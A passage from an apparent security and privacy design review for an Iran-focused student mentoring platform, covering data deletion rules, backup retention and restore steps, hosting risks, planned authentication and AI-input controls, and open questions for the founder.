| `question_messages` written by the user, `checkins` | Texts ← `'[حذف شد]'` ("[Deleted]") |
| `notes` about the student, `student_flags` | Delete completely |
| `milestones` | `evidence_text` and `amount` ← `null`. The type and date stay (the anonymous North Star statistics are preserved) |
| `attachments` (all of this student's parents) | Delete the file from storage and the row |
| `timeline_events` | `data` of `student.updated` and `profile.*` events ← `{}` |
| `audit_log` | Rows stay; every mobile number in `data` is masked; one `user.erased` row (with only `target_id`) is added |

- **Staff:** deleting a mentor or admin clears the same `users` columns. Their notes and feedback stay for the student's record, and the author is displayed as "Former mentor".
- **Backups:** deleted data stays in the backups until the end of the backup retention period (8 weeks at most). This must be stated on the privacy page. The **restore runbook** must, after every restore, re-run the delete command for all `target_id`s of `user.erased` in `audit_log` (so `audit_log` is the source of the "deletion list" and itself must not be restored from an older backup without this step).
- **Deactivation** (`disabled`) is not deletion. It only blocks login.

---

## 8. Hosting and data governance (review of H5 and H7 in ADR-0002)

- **H5 (provider terms and sanctions):** from a security standpoint, the main consequence is a **suspension of the account without warning**, that is, losing the Azure application, database and backups at the same time. The needed control is precisely the encrypted backup outside Azure (SEC-K4, SEC-K5), and keeping **the `age` key and the domain registrar (DNS) access** outside that same account so that a migration remains possible. This review does not suggest any way to circumvent the provider's terms. Question Q1 is with the founder only.
- **H7 (domestic law on keeping data abroad):** a legal review is beyond this role's ability and was **not confirmed**. Risk reduction on our side: data minimization (no national ID number, no address, no email, no platform account password), transparency with the user (SEC-F4: "Your data is kept on a server outside Iran, and we also have an encrypted backup inside Iran"), and the deletion policy (section 7).
- **The backup destination inside Iran:** the files are encrypted and the private key is not there. So the domestic provider cannot see the content. In an **emergency migration**, the key must come to the Iranian server, and from that moment all the controls of this document (headers, TLS, database firewall, logs) must also hold on the new host. The migration runbook checklist (DO) should refer to section 5 of this document.

---

## 9. Outside 0.1 (for the 1.0 ADRs)
- **Admin two-step login:** TOTP (an authenticator app, with no SMS dependency) **before inviting a second admin or reaching more than 150 students**, whichever comes first.
- **RLS** on `notes`, `student_flags` and `student_health` together with the AI module (ADR-0004 says the same).
- **SMS OTP (F16):** a send rate limit per mobile number and IP, a lifetime of 2 minutes, at most 5 attempts, and the SIM swap risk for staff accounts (OTP alone is not enough for staff).
- **AI tools:** the job post and proposal text input is **untrusted** (prompt injection), must not leak the system prompt, a cost quota before the call (F17), removing the client's and the student's names before sending to the provider, and respecting `ai_use_consent` and its withdrawal.
- **Payments:** confirm the amount and status on the server side with the gateway API (not the callback), idempotency, a domestic callback relay if the server is abroad. In the `billing` module ADR.

## 10. Open questions for the founder (to be added to `STATUS.md`)
1. **S1:** Approve the retention policy of section 7-1 (especially the 24 months of audit and 8 weeks of backups) and the 30-day account deletion deadline.
2. **S2:** Where and with whom should the backup private key (`age`) be kept? (Proposal: with the founder, one copy on an offline flash drive and one in a personal password manager.)
3. **S3:** Does the coach accept that on accepting an invite the student also enters their mobile number (C1)? (Proposal: yes; it takes 5 seconds and prevents takeover through a forwarded link.)
4. **S4:** Do the mentors work on a shared laptop or phone? If yes, the staff session lifetime should be shorter than 7 days.
